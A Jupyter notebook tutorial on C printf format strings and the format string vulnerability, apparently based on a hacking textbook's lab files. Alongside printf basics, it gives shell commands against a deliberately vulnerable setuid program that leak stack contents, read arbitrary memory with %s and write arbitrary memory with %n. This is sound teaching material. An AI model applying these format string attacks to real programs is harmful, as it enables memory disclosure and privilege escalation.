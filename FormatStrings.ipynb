{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Format Strings\n",
    "http://www.cplusplus.com/reference/cstdio/printf/?kw=printf\n",
    "\n",
    "- `printf()` in C/C++ can be used to print fixed strings, variables in many different formats\n",
    "- the following program uses `printf()` incorrectly!\n",
    "- \"Hello World\\n\" string technically is the format string (devoid of special escape sequences called format parameters)\n",
    "- format parameters begins with a `%` sign; for each format parameter (%) function expects arguments\n",
    "- format specifier follows this prototype:\n",
    "`%[flags][width][.precision][length]specifier`\n",
    "\n",
    "- following parameter requires values as arguments\n",
    "\n",
    "| Parameter | Output Type |\n",
    "| --- | --- |\n",
    "| %d | Decimal |\n",
    "| %u | Unsigned decimal |\n",
    "| %x | Hexadecimal |\n",
    "\n",
    "- the following parameters expect pointers as arguments\n",
    "\n",
    "| Parameter | Output Type |\n",
    "| --- | --- |\n",
    "| %s | String |\n",
    "| %n | Number of bytes written so far |\n",
    "| %p | Memory address |"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hello World!\n"
     ]
    }
   ],
   "source": [
    "#include <stdio.h>\n",
    "\n",
    "int main() {\n",
    "    printf(\"Hello World!\\n\");\n",
    "    return 0;\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[A] Dec: -73, Hex: ffffffb7, Unsigned: 4294967223\n",
      "[B] Dec: 31337, Hex: 7a69, Unsigned: 31337\n",
      "[field width on B] 3: '31337', 10: '     31337', '00031337'\n",
      "[string] sample  Address 0xbfd420d2\n",
      "variable A is at address: 0xbfd420c8\n"
     ]
    }
   ],
   "source": [
    "// fmt_strings.c\n",
    "\n",
    "#include <stdio.h>\n",
    "#include <string.h>\n",
    "\n",
    "int main() {\n",
    "   char string[10];\n",
    "   int A = -73;\n",
    "   unsigned int B = 31337;\n",
    "\n",
    "   strcpy(string, \"sample\");\n",
    "\n",
    "   // Example of printing with different format string\n",
    "   printf(\"[A] Dec: %d, Hex: %x, Unsigned: %u\\n\", A, A, A);\n",
    "   printf(\"[B] Dec: %d, Hex: %x, Unsigned: %u\\n\", B, B, B);\n",
    "   printf(\"[field width on B] 3: '%3u', 10: '%10u', '%08u'\\n\", B, B, B);\n",
    "   printf(\"[string] %s  Address %p\\n\", string, string);\n",
    "\n",
    "   // Example of unary address operator (dereferencing) and a %x format string\n",
    "   printf(\"variable A is at address: %p\\n\", &A);\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## The Format String Vulnerability\n",
    "- using `printf(string)` instead of `printf(\"%s\", string)`\n",
    "- compile and run fmt_vuln.c from booksrc folder\n",
    "```bash\n",
    "$ .compile.sh fmt_vuln.c fmt_vuln.exe\n",
    "$ sudo chmod u+s ./fmt_vuln.exe\n",
    "$ ./fmt_vuln testing\n",
    "$ ./fmt_vuln testing%x\n",
    "$ ./fmt_vuln $(perl -e 'print \"%08x.\"x40')\n",
    "```\n",
    "- print four repeating bytes in reverse order (little-endian architecture)\n",
    "- $ printf \"\\x25\\x30\\x38\\x78\\x2e\\n\"\n",
    "    - these are the arguments for format string stored in higher memory addresses"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Reading from Arbitrary Memory Addresses\n",
    "- `%s` format parameter can be used to read from arbitrary memory addresses\n",
    "- part of the original format string can be used to supply an address to the %s format parameter\n",
    "```bash\n",
    "$ ./fmt_vuln.exe AAAA%08x.%08x.%08x.%08x\n",
    "$ ./fmt_vuln.exe AAAA%08x.%08x.%08x.%s # get segfault\n",
    "```\n",
    "- if a valid memory address is used, this process could be used to read a string found at that memory address\n",
    "```bash\n",
    "$ env | grep $PATH\n",
    "```\n",
    "- compile and run booksrc/getenvaddr.c\n",
    "```bash\n",
    "$ ./compile.sh getenvaddr.c getenvaddr\n",
    "$ ./getenvaddr PATH ./fmt_vuln.exe\n",
    "```\n",
    "- use the path address to provide the value for %s\n",
    "```bash\n",
    "$ ./fmt_vuln.exe $(print \"\\x address in reverse bytes\")%08x.%08x.%08x.%s\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Writing to Arbitrary Memory Addresses\n",
    "- `%n` format parameter can be used to write to arbitrary memory address\n",
    "- `test_val` variable has been printing its address and value in the debug statement\n",
    "```bash\n",
    "$ fmt_vuln.exe $(printf \"\\x reverse address of test_val\")%08x.%08x.%08x.%n\n",
    "```\n",
    "- the resulting value in the test variable depends on the number of bytes written before the `%n`\n",
    "- this can be controlled to a a greater degree by manipulating the field width option\n",
    "```bash\n",
    "$ fmt_vuln.exe $(printf \"\\x reverse address of test_val\")%x%x%x%n\n",
    "$ fmt_vuln.exe $(printf \"\\x reverse address of test_val\")%x%x%100x%n\n",
    "$ fmt_vuln.exe $(printf \"\\x reverse address of test_val\")%x%x%400x%n\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Writing User-Controlled Values (0xaddress)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "C",
   "language": "c",
   "name": "c"
  },
  "language_info": {
   "file_extension": ".c",
   "mimetype": "text/plain",
   "name": "c"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
